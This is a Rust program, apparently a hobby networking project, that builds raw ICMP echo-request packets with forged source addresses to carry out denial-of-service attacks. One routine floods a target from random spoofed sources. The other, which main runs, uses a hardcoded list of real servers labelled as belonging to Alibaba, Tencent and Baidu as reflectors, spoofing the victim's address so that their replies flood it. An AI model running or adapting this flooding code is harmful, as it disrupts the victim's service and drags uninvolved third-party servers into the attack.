#![feature(box_syntax)]


use std::{
    error::Error,
    mem::size_of,
    net::Ipv4Addr,
    str::FromStr, thread::{ self, JoinHandle },
    ptr::write
};

use clap::Parser;
use libc::{getpid, sockaddr_in, socket, AF_INET, SOCK_RAW, sendto, c_void, sockaddr};
use netlib::{
    aux::{htons, random, HostOrIPv4, ntohl},
    data::{SockAddrIn, InAddrN},
    error::NetErr,
    network::{
        icmp::{ICMPType, ICMP},
        ip::{Protocol, IP, HLV, ToS, PL}, inet_cksum,
    }, err::ErrNo, view::U16N,
};

const PACKAGE_SIZE: usize = size_of::<IP>() + size_of::<ICMP>() + 64;
static mut RAWSOCK: i32 = 0;


pub unsafe fn quick_ping_once(ip_src: u32, mut dst: sockaddr_in) -> Result<(), NetErr> {
    let mut sendbuf = [0u8; PACKAGE_SIZE];

    let mut iphdr = IP {
        // 5 * 4 = 20 bytes, ipv4
        ihl_v: HLV::new(5, 4),
        tos: ToS::default(),
        len: PL::from_native(PACKAGE_SIZE as u16),
        id: U16N::from_native(getpid() as u16),
        frag_off: Default::default(),
        ttl: 200,
        protocol: Protocol::ICMP,
        checksum: 0,
        ip_src: InAddrN::from_native_u32(ip_src),
        ip_dst: InAddrN::from_native_u32(dst.sin_addr.s_addr),
    };

    write(
        sendbuf[..size_of::<IP>()].as_mut_ptr() as *mut IP,
        iphdr
    );

    iphdr.checksum = inet_cksum(sendbuf.as_ptr(), size_of::<IP>());

    write(
        sendbuf[..size_of::<IP>()].as_mut_ptr() as *mut IP,
        iphdr
    );

    let ty = ICMPType::EchoRequest.into();
    let icmphdr = ICMP {
        ty,
        code: 0,
        cksum: htons(!((ty as u16) << 8)),
        un: 0,
    };

    write(
        sendbuf[size_of::<IP>()..].as_mut_ptr() as *mut ICMP,
        icmphdr
    );

    let size = sendto(
        RAWSOCK,
        sendbuf.as_mut_ptr() as *mut c_void,
        PACKAGE_SIZE,
        0,
        &mut dst as *mut sockaddr_in as *mut sockaddr,
        size_of::<sockaddr_in>() as u32
    );

    let src = Ipv4Addr::from(ip_src);
    // let dst = transmute::<sockaddr_in, SockAddrIn>(dst);
    let dst = Ipv4Addr::from(ntohl(dst.sin_addr.s_addr));

    if size < 0 {
        let errno = ErrNo::fetch();

        eprintln!("{:#?} sendto {:#?} failed({errno:#?})", src, dst);
        return Err(NetErr::SendTo);
    }
    else {
        println!("{:#?} sendto {:#?} succeed", src, dst);
    }

    Ok(())
}

#[allow(unused)]
unsafe fn dos_ping_fake_src(dst: sockaddr_in) {
    loop {
        let ip_src = (random() % u32::MAX as usize) as u32;
        match quick_ping_once(ip_src, dst) {
            Ok(_) => {

            },
            Err(_err) => {

            },
        }
    }
}

#[allow(unused)]
unsafe fn dos_ping_reflection(reflect_from: sockaddr_in, reflect_to: u32) {
    loop {
        match quick_ping_once(reflect_to, reflect_from) {
            Ok(_) => {

            },
            Err(_err) => {

            },
        }
    }
}


////////////////////////////////////////////////////////////////////////////////
//// Cli

#[derive(Parser)]
#[clap()]
struct Cli {
    #[clap()]
    dst: String,
}


fn main() -> Result<(), Box<dyn Error>> {
    let cli = Cli::parse();
    let dst = cli.dst;

    unsafe {
        let hostorip = HostOrIPv4::from_str(&dst)?;

        let dst: Ipv4Addr = hostorip.try_into()?;
        let cdst: sockaddr_in = SockAddrIn::from(dst).into();

        // IPPROTO_RAW - 255
        RAWSOCK = socket(AF_INET, SOCK_RAW, Protocol::Reserved as i32);
        if RAWSOCK < 0 {
            return Err(box NetErr::CreateRawSocket);
        }

        // ICMP DoS Attack: Fake Source
        // let threads: Vec<JoinHandle<()>> = (0..128).into_iter()
        // .map(move |i| {
        //     thread::Builder::new()
        //     .name(format!("dos-child-{}", i))
        //     .spawn(move || {
        //         dos_ping_fake_src(cdst)
        //     }).unwrap()
        // })
        // .collect();

       // ICMP DoS Attack: Reflection
        let ip_pool: Vec<Ipv4Addr> = vec![
            // alibaba.com
            "203.119.129.109",
            "203.119.215.82",
            // tencent.com
            "109.244.194.121",
            // baidu.com
            "110.242.68.66",
            "39.156.66.10"
        ].into_iter()
        .map(|s| {
            s.parse::<Ipv4Addr>().unwrap()
        })
        .collect();

        let threads: Vec<JoinHandle<()>> = ip_pool
        .into_iter()
        .map(move |ipv4| {
            let refrelct_from = SockAddrIn::from(ipv4).into();

            thread::Builder::new()
            .name(format!("dos-child-{:#?}", ipv4))
            .spawn(move || {
                dos_ping_reflection(refrelct_from, cdst.sin_addr.s_addr)
            }).unwrap()
        })
        .collect();

        for handler in threads.into_iter() {
            handler.join().unwrap();
        }

    }

    Ok(())
}
